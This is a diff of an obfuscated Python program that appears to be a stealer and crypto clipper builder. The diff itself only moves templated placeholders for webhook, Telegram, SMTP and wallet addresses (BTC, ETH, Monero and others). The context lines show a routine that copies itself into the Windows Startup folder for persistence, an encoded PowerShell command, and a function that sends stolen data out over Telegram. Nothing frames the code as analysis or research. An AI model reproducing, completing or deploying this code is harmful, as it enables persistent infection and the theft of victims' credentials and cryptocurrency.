@@ -24,6 +24,26 @@ dsvisdf = '%Brxger%'
 yxuiue = '%Bxud%'
 deiuc = '%Hdhji%'
 
+deswsjn = '%webhook%'
+
+kuhio49 = '%tele%'
+kuhioxx49 = '%chatid%'
+
+regh54 = '%smtp%'
+
+dvxkioucb = '%pas%'
+
+fwefg54z54 = '%rec%'
+
+r6zuj75654 = 'Clipper | Wallet Copied'
+
+hrextr_R2Xoy1 = '%BTC%'
+hrextr_R2Xoy2 = '%ETH%'
+hrextr_R2Xoy3 = '%MONERO%'
+hrextr_R2Xoy4 = '%LTC%'
+hrextr_R2Xoy5 = '%DOGE%'
+hrextr_R2Xoy6 = '%TRX%'
+
 def esuih():
     try:
         euifew.copy(ewsjinf783.path.abspath(wzf8u4w7.argv[0]), ewsjinf783.path.join(ewsjinf783.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'))
@@ -66,18 +86,7 @@ moon = 'powershell.exe -EncodedCommand RwBlAHQALQBDAG8AbQBwAHUAdABlAHIAUgBlAHMAd
 
 
 
-deswsjn = '%webhook%'
 
-kuhio49 = '%tele%'
-kuhioxx49 = '%chatid%'
-
-regh54 = '%smtp%'
-
-dvxkioucb = '%pas%'
-
-fwefg54z54 = '%rec%'
-
-r6zuj75654 = 'Clipper | Wallet Copied'
 
 
 def awfes54():
@@ -144,16 +153,6 @@ async def egreger453645(wadwa32, fexccxvxcew, ewsfuin8934, fweijf):
         await zh5.send_message(chat_id=kuhioxx49, text=eguo6643)
     except Exception as e:
         pass
-
-
-hrextr_R2Xoy1 = '%BTC%'
-hrextr_R2Xoy2 = '%ETH%'
-hrextr_R2Xoy3 = '%MONERO%'
-hrextr_R2Xoy4 = '%LTC%'
-hrextr_R2Xoy5 = '%DOGE%'
-hrextr_R2Xoy6 = '%TRX%'
-
-
 
 
 def vdsu281cjm():
